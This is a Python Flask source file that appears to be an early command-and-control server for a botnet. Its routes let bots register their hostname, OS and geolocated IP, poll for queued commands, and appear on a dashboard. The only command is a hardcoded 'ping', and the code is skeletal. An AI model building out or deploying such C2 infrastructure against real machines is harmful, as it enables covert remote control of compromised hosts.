from flask import Blueprint, render_template, request, jsonify
from therum.helper import get_region

bp = Blueprint('main', __name__)

agents = {}
tasks = {}

@bp.route("/status", methods=["POST"])
def status():
    bot_id = request.json.get('agent_id')
    host = request.json.get("hostname")
    os = request.json.get("os")
    uptime_agent = request.json.get("uptime")
    ip = request.remote_addr

    if bot_id not in agents:
        agents[bot_id] = {
            "Address": ip,
            "Hostname":host,
            "OS":os,
            "Region":get_region(ip),
            "last_check": uptime_agent
        }

        print(agents)

        return jsonify({"status":"registed"})
    else:
        agents[bot_id]["last_check"] = uptime_agent
        return jsonify({"status":"update"})

@bp.route("/task/<bot_id>", methods=["GET"])
def get_task(bot_id):
    if bot_id in tasks and tasks[bot_id]:
        payload = tasks[bot_id].copy()
        tasks[bot_id] = []

        return jsonify({"task": payload})
    return jsonify({"task":None})

@bp.route("/send_task",methods=["GET"])
def task():
    bot_id = "Test"
    command = "ping"

    if bot_id not in tasks:
        tasks[bot_id] = []


    tasks[bot_id] ={
        "command":command
    }

    return jsonify({"task":"created"})

@bp.route("/dashboard", methods=["GET"])
def dashboard():
    return render_template("pages/dashboard.html", bots= agents)
